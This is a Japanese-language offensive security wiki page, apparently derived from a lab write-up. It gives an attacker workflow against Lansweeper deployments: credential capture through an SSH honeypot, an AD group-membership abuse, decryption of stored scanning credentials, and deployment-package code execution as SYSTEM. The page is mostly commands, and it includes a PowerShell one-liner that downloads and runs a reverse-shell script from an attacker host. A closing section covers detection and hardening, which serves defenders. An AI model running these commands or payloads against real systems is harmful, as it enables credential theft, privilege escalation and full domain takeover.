# Lansweeper 悪用: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper は、Windows 上に配備され、Active Directory と統合されることが多い IT 資産の検出およびインベントリプラットフォームです。Lansweeper に設定された資格情報は、SSH、SMB/WMI、WinRM などのプロトコルを介して資産へ認証するためにスキャンエンジンによって使用されます。設定ミスによりしばしば次が可能になります：

- スキャンターゲットを攻撃者管理ホスト（honeypot）にリダイレクトすることでの credential interception
- Lansweeper 関連グループによって公開された AD ACLs を悪用してリモートアクセスを取得
- ホスト上での Lansweeper 設定済みの secrets の復号（connection strings と保存された scanning credentials）
- Deployment 機能を介した管理対象エンドポイントでのコード実行（多くの場合 SYSTEM として実行）

このページは、エンゲージメント中にこれらの挙動を悪用するための実践的な攻撃者ワークフローとコマンドをまとめたものです。

## 1) honeypot を使ったスキャン資格情報の収集 (SSH の例)

Idea: create a Scanning Target that points to your host and map existing Scanning Credentials to it. When the scan runs, Lansweeper will attempt to authenticate with those credentials, and your honeypot will capture them.

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
キャプチャした creds を DC サービスに対して検証する:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
注意
- スキャナーを自分のリスナーに強制できる場合、他のプロトコルでも同様に機能する（SMB/WinRM honeypots など）。SSH が最も単純なことが多い。
- 多くのスキャナーは明確なクライアントバナーで自分自身を識別する（例: RebexSSH）し、uname や whoami などの無害なコマンドを試みる。

## 2) AD ACL abuse: アプリ管理者グループに自分を追加してリモートアクセスを獲得

侵害したアカウントから有効な権限を列挙するには BloodHound を使用する。一般的な発見例として、スキャナーやアプリ固有のグループ（例: “Lansweeper Discovery”）が特権グループ（例: “Lansweeper Admins”）に対して GenericAll を持っていることがある。もしその特権グループが “Remote Management Users” のメンバーでもあれば、我々が自分を追加すると WinRM が利用可能になる。

収集例:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
BloodyAD (Linux) を使ってグループの GenericAll を悪用する:
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
次に、interactive shellを取得する:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
ヒント: Kerberos の操作は時間に敏感です。KRB_AP_ERR_SKEW が発生した場合は、まず DC と時刻を同期してください:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Decrypt — ホスト上の Lansweeper に設定されたシークレット

Lansweeper サーバーでは、ASP.NET サイトが通常、アプリケーションで使用される暗号化された connection string と対称鍵を格納しています。適切なローカルアクセス権があれば、DB connection string を復号し、保存されているスキャン用の認証情報を抽出できます。

Typical locations:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- アプリケーションキー: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

SharpLansweeperDecrypt を使って、保存された認証情報の復号とダンプを自動化します:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
予想される出力には、DB接続の詳細や、環境全体で使用されるWindowsやLinuxアカウントなどのプレーンテキストのスキャン用資格情報が含まれます。これらはしばしばドメインホスト上で昇格したローカル権限を持っています:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
回収した Windows scanning creds を使用して特権アクセスを取得する:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

“As a member of “Lansweeper Admins”, the web UI exposes Deployment and Configuration. Under Deployment → Deployment packages, you can create packages that run arbitrary commands on targeted assets. Execution is performed by the Lansweeper service with high privilege, yielding code execution as NT AUTHORITY\SYSTEM on the selected host.

High-level steps:
- Create a new Deployment package that runs a PowerShell or cmd one-liner (reverse shell, add-user, etc.).
- Target the desired asset (e.g., the DC/host where Lansweeper runs) and click Deploy/Run now.
- Catch your shell as SYSTEM.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- デプロイ操作はノイズが大きく、LansweeperやWindowsのイベントログに痕跡を残します。必要最小限で使用してください。

## 検出とハードニング

- 匿名のSMB列挙を制限または無効化します。RID cyclingやLansweeperの共有への異常なアクセスを監視してください。
- 送信制御：スキャナホストからの outbound SSH/SMB/WinRM をブロックまたは厳格に制限します。非標準ポート（例: 2022）やRebexのような異常なクライアントバナーに対してアラートを出してください。
- Protect `Website\\web.config` and `Key\\Encryption.txt`。シークレットをvaultに外部化し、露出時にローテーションしてください。最小権限のサービスアカウントや、可能な場合はgMSAの利用を検討してください。
- AD監視：Lansweeper関連グループ（例: “Lansweeper Admins”, “Remote Management Users”）の変更や、特権グループに対してGenericAll/Writeメンバーシップを付与するACL変更にアラートを設定してください。
- 展開パッケージの作成/変更/実行を監査し、パッケージが cmd.exe/powershell.exe を起動したり、予期しない outbound 接続を行った場合にアラートを出してください。

## Related topics
- SMB/LSA/SAMR enumeration and RID cycling
- Kerberos password spraying and clock skew considerations
- BloodHound path analysis of application-admin groups
- WinRM usage and lateral movement

## References
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
